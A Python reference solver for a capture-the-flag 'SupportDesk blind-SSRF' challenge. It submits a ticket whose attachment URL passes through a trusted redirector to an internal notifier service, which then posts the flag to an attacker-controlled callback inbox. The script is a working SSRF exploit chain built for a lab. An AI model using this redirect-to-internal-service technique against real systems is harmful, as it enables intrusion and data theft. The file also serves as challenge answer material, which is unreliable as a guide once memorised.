#!/usr/bin/env python3
"""Reference solver for the SupportDesk blind-SSRF challenge.

The script uses only the public web API.  In particular, it never connects to
Docker-only services directly: it lets the ticket scanner follow the trusted
short-link redirect and then reads the resulting callback delivery.
"""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any


FLAG_PATTERN = re.compile(r"stctf\{[^\s{}]+\}", re.ASCII)
SCAN_TIMEOUT_SECONDS = 18.0
DELIVERY_TIMEOUT_SECONDS = 10.0
POLL_INTERVAL_SECONDS = 0.20


class SolveError(RuntimeError):
    """A failure in the expected public solve flow."""


class SupportDeskClient:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.cookies = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies),
        )

    def url(self, path: str) -> str:
        return f"{self.base_url}/{path.lstrip('/')}"

    def request_json(
        self,
        method: str,
        path: str,
        payload: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        data = None
        headers = {"Accept": "application/json"}
        if payload is not None:
            data = json.dumps(payload, separators=(",", ":")).encode("utf-8")
            headers["Content-Type"] = "application/json"

        request = urllib.request.Request(
            self.url(path), data=data, headers=headers, method=method,
        )
        try:
            with self.opener.open(request, timeout=10) as response:
                if not 200 <= response.status < 300:
                    raise SolveError(f"unexpected HTTP {response.status} for {method} {path}")
                raw = response.read()
        except urllib.error.HTTPError as error:
            raise SolveError(f"HTTP {error.code} for {method} {path}") from error
        except urllib.error.URLError as error:
            raise SolveError(f"could not reach {self.base_url}: {error.reason}") from error

        try:
            decoded = json.loads(raw.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as error:
            raise SolveError(f"invalid JSON response for {method} {path}") from error
        if not isinstance(decoded, dict):
            raise SolveError(f"unexpected JSON response for {method} {path}")
        return decoded

    def start_session(self) -> None:
        """Visit the public landing page, which establishes sd_session."""
        request = urllib.request.Request(self.url("/"), headers={"Accept": "text/html"})
        try:
            with self.opener.open(request, timeout=10) as response:
                response.read()
        except urllib.error.URLError as error:
            raise SolveError(f"could not open the SupportDesk landing page: {error.reason}") from error

        if not any(cookie.name == "sd_session" for cookie in self.cookies):
            raise SolveError("landing page did not establish sd_session")


def require_string(value: object, label: str) -> str:
    if not isinstance(value, str) or not value:
        raise SolveError(f"missing {label}")
    return value


def notifier_test_url(callback_url: str) -> str:
    query = urllib.parse.urlencode({"callback": callback_url})
    return f"http://notifier:8080/subscriptions/test?{query}"


def trusted_redirect_url(target_url: str) -> str:
    query = urllib.parse.urlencode({"to": target_url})
    return f"http://go.support.local/r?{query}"


def wait_for_ticket_passed(client: SupportDeskClient, ticket_id: str) -> dict[str, Any]:
    deadline = time.monotonic() + SCAN_TIMEOUT_SECONDS
    last_status: object = None
    while time.monotonic() < deadline:
        ticket = client.request_json("GET", f"/api/tickets/{ticket_id}")
        status = ticket.get("scanStatus")
        last_status = status
        if status == "passed":
            return ticket
        if status in {"rejected", "failed"}:
            raise SolveError(f"ticket scan ended as {status!r}")
        if status not in {"pending", "checking"}:
            raise SolveError(f"ticket has an invalid scan status: {status!r}")
        time.sleep(POLL_INTERVAL_SECONDS)
    raise SolveError(f"ticket did not pass before timeout (last status: {last_status!r})")


def header_value(headers: object, name: str) -> str | None:
    if not isinstance(headers, dict):
        return None
    wanted = name.lower()
    for key, value in headers.items():
        if not isinstance(key, str) or key.lower() != wanted:
            continue
        if isinstance(value, str):
            return value
        if isinstance(value, list):
            for item in value:
                if isinstance(item, str):
                    return item
    return None


def wait_for_flag_delivery(client: SupportDeskClient, inbox_id: str) -> str:
    deadline = time.monotonic() + DELIVERY_TIMEOUT_SECONDS
    while time.monotonic() < deadline:
        response = client.request_json("GET", f"/api/inboxes/{inbox_id}/deliveries")
        deliveries = response.get("deliveries")
        if not isinstance(deliveries, list):
            raise SolveError("deliveries endpoint did not return a deliveries array")

        for delivery in deliveries:
            if not isinstance(delivery, dict):
                continue
            verification_code = header_value(delivery.get("headers"), "x-verification-code")
            if verification_code is None:
                continue
            match = FLAG_PATTERN.fullmatch(verification_code)
            if match is not None:
                return match.group(0)
        time.sleep(POLL_INTERVAL_SECONDS)
    raise SolveError("callback delivery did not contain X-Verification-Code before timeout")


def solve(base_url: str) -> str:
    client = SupportDeskClient(base_url)
    client.start_session()

    inbox = client.request_json("POST", "/api/inboxes", {"name": "Solver callback"})
    inbox_id = require_string(inbox.get("id"), "inbox id")
    callback_url = require_string(inbox.get("callbackUrl"), "callback URL")

    # The scanner validates this outer URL only.  The trusted legacy redirector
    # then sends it to notifier, whose side-effect posts the flag to our inbox.
    attachment_url = trusted_redirect_url(notifier_test_url(callback_url))
    ticket = client.request_json(
        "POST",
        "/api/tickets",
        {
            "subject": "Проверка ссылки на товар",
            "description": "Пожалуйста, проверьте ссылку из интеграции.",
            "attachmentUrl": attachment_url,
        },
    )
    ticket_id = require_string(ticket.get("id"), "ticket id")

    wait_for_ticket_passed(client, ticket_id)
    return wait_for_flag_delivery(client, inbox_id)


def parse_base_url(value: str) -> str:
    parsed = urllib.parse.urlsplit(value)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise argparse.ArgumentTypeError("base URL must start with http:// or https://")
    if parsed.query or parsed.fragment:
        raise argparse.ArgumentTypeError("base URL must not contain a query string or fragment")
    return value.rstrip("/")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Solve the SupportDesk challenge")
    parser.add_argument("base_url", type=parse_base_url, help="e.g. http://127.0.0.1:8080")
    args = parser.parse_args(argv)

    try:
        flag = solve(args.base_url)
    except (OSError, ValueError, KeyError, SolveError) as error:
        print(f"solve failed: {error}", file=sys.stderr)
        return 1

    # Keep stdout machine-readable for CTFd/E2E runners.
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
